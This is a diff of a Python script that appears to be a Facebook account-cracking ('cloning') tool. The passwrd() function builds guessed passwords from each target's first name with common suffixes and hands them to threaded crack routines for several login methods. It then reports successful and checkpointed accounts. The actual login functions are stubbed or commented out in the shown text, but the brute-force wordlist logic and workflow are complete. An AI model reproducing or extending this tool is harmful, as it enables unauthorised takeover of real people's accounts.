@@ -632,24 +632,7 @@ def setting():
  
 #-------------------[ BAGIAN-WORDLIST ]------------#
  
-import os
-import time
-import random
-import requests
-import re
-from concurrent.futures import ThreadPoolExecutor as tred
 
-# Define the crack function
-def crack(idf, pwv):
-    # Add your crack logic here
-    pass
-
-# Define the crackfree function
-def crackfree(idf, pwv):
-    # Add your crackfree logic here
-    pass
-
-# Define the passwrd function
 def passwrd():
     os.system('clear')
     print(logo)
@@ -692,56 +675,52 @@ def passwrd():
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
-                    pwv.append(frs+'@12')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
-                    pwv.append(frs+'@123456')
-                    pwv.append(frs+'@111')
-                    pwv.append(frs+'@1111')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'123@')
+                   pwv.append(frs+'12')
+                   pwv.append(frs+'123')
+                   pwv.append(frs+'1234')
+                   pwv.append(frs+'12345')
+                   pwv.append(frs+'123456')
+                   pwv.append(nmf)
+                   pwv.append(frs+'@12')
+                   pwv.append(frs+'@123')
+                   pwv.append(frs+'@1234')
+                   pwv.append(frs+'@12345')
+                   pwv.append(frs+'@123456')
+                   pwv.append(frs+'@111')
+                   pwv.append(frs+'@1111')
+                   pwv.append(frs+'@@')
+                   pwv.append(frs+'@@@')
+                   pwv.append(frs+'@1234')
+                   pwv.append(frs+'@12345')
+                   pwv.append(frs+'@@@')
+                   pwv.append(frs+'@#')
+                   pwv.append(frs+'123@')
                                         
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
-            else:
-                pass
+            else:pass
             if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
+                pool.submit(crack,idf,pwv)
             elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             elif 'touch' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             elif 'mbasic' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             else:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
     print('\033[0;91m-----------------------------------------------')
     print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
-    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
+    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\033[0;91m-----------------------------------------------')
-    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
-    os.system("python TOXIC.py")
+    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
+    os.system("python AMUL.py")
     exit() 
-
-# Your other code goes here...
 
 
 #--------------------[ METODE-B-API ]-----------------#
- 
  
 # def crackfree(idf,pwv):
 #     global loop,ok,cp
